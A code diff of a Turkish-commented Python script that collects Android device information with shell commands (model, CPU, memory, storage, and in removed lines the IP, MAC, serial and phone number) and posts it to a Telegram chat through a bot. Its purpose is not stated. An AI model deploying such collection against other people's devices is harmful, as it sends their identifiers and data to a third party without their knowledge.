@@ -8,48 +8,31 @@ bot = telebot.TeleBot(TOKEN)
 
 # 📌 1. Cihaz Bilgilerini Al
 def get_system_info():
-    # Model ve Üretici
     model = os.popen("getprop ro.product.model").read().strip()
     manufacturer = os.popen("getprop ro.product.manufacturer").read().strip()
-
-    # Android sürümü
     android_version = os.popen("getprop ro.build.version.release").read().strip()
-
-    # Ekran Çözünürlüğü
-    screen_resolution = os.popen("wm size").read().strip()
+    screen_resolution = os.popen("wm size").read().strip()  # Alternatif çözünürlük komutu
     screen_density = os.popen("wm density").read().strip()
-
-    # İşlemci (CPU) bilgileri
     cpu_info = os.popen("cat /proc/cpuinfo").read().strip()
-
-    # RAM bilgileri
     ram_info = os.popen("cat /proc/meminfo | grep Mem").read().strip()
-
-    # Depolama Bilgileri
     storage_info = os.popen("df -h /storage/emulated/0").read().strip()
 
-    # IP Adresi
-    ip_address = os.popen("ip a | grep 'inet ' | awk '{print $2}'").read().strip()
+    # Root gerektirmeyen IP adresi ve Wi-Fi MAC adresi alma
+    ip_address = "Root gerektirdiği için alınamıyor."
+    mac_address = "Root gerektirdiği için alınamıyor."
 
-    # Wi-Fi MAC Adresi
-    mac_address = os.popen("cat /sys/class/net/wlan0/address").read().strip()
+    # Batarya durumu (Root gerektirebilir)
+    battery_info = "Root gerektirdiği için alınamıyor."
 
-    # Seri Numarası
-    serial_number = os.popen("getprop ro.serialno").read().strip()
-
-    # Batarya Durumu
-    battery_info = os.popen("cat /sys/class/power_supply/battery/capacity").read().strip()
+    # Seri numarası (Root gerektirebilir)
+    serial_number = "Root gerektirdiği için alınamıyor."
 
     # SIM Kart Bilgisi
-    sim_info = os.popen("getprop gsm.operator.alpha").read().strip()
+    sim_info = "Root gerektirdiği için alınamıyor."
 
-    # Telefon Numarası
-    phone_number = os.popen("getprop gsm.phone.default").read().strip()
+    # Telefon numarası (Eğer alınabiliyorsa)
+    phone_number = "Root gerektirdiği için alınamıyor."
 
-    # Wi-Fi Durumu
-    wifi_status = os.popen("dumpsys wifi | grep 'Wi-Fi is'").read().strip()
-
-    # Bilgileri birleştir
     info = f"""
 📱 *Cihaz Bilgileri:*  
 Model: {manufacturer} {model}  
@@ -62,18 +45,20 @@ Depolama: {storage_info}
 IP Adresi: {ip_address}  
 Wi-Fi MAC Adresi: {mac_address}  
 Seri Numarası: {serial_number}  
-Batarya Durumu: {battery_info}%  
+Batarya Durumu: {battery_info}  
 SIM Bilgisi: {sim_info}  
-Telefon Numarası: {phone_number}  
-Wi-Fi Durumu: {wifi_status}
+Telefon Numarası: {phone_number}
 """
 
     return info
 
-# 📌 Telegram’a Gönder
+# 📌 Bilgileri Telegram'a Gönder
 def send_report():
     system_info = get_system_info()
-    bot.send_message(CHAT_ID, system_info, parse_mode="Markdown")
 
-# 📌 Çalıştır
+    message = f"📱 *Cihaz Bilgileri:* \n```{system_info}```"
+
+    bot.send_message(CHAT_ID, message, parse_mode="Markdown")
+
+# 📌 Botu Çalıştır ve Bilgileri Gönder
 send_report()
